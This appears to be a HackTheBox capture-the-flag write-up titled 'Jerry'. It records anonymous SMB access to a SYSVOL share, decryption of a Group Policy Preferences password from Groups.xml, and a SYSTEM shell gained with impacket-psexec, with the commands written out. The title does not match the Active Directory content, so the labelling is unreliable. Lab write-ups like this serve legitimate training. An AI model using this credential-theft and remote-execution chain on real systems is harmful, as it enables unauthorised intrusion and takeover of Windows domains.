+++
date = '2025-05-08T15:21:51+03:00'
draft = false
title = 'Jerry'
+++

---
os: Windows
status: Pwned
tags: [active-directory, gpp, groups-xml, psexec]
aliases:
IP:
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports: 445
Notes: GPP password in groups.xml, PSExec for access
---
# Resolution summary

>[!summary]
>- Anonymous SMB login successful
>- Found Groups.xml file containing GPP encrypted password
>- Decrypted GPP Administrator cpassword
>- Used credentials with PSExec to gain SYSTEM access

## Improved skills

- Group Policy Preferences (GPP) exploitation
- SMB enumeration
- GPP password decryption
- PSExec usage

## Used tools

- [[SMBClient]]
- gpp-decrypt
- [[Impacket]] psexec

---

# Information Gathering

Scanned all TCP ports:

```bash
nmap -sV -sC -p- 10.10.10.100 -oA nmap_scans/active
```

Enumerated open TCP ports:

```bash
# SMB ports open (139, 445)
# Active Directory ports
```

---

# Enumeration

## Port 445 - SMB

Anonymous SMB access allowed:

```bash
smbclient -L //10.10.10.100 -N
smbclient //10.10.10.100/SYSVOL -N
```

Found accessible SYSVOL share.

---

# Exploitation

## GPP Password Extraction

1. Connected anonymously to SMB
2. Navigated SYSVOL share
3. Found Groups.xml file containing GPP encrypted password
4. Extracted cpassword value

Decrypted GPP password:
```bash
gpp-decrypt <cpassword>
```

Obtained Administrator credentials.

## PSExec Access

Used credentials to gain SYSTEM shell:

```bash
impacket-psexec administrator:password@10.10.10.100
```

---

# Trophy

>[!todo] **User.txt**
>Obtained via Administrator access

>[!todo] **Root.txt**
>Obtained via PSExec SYSTEM shell
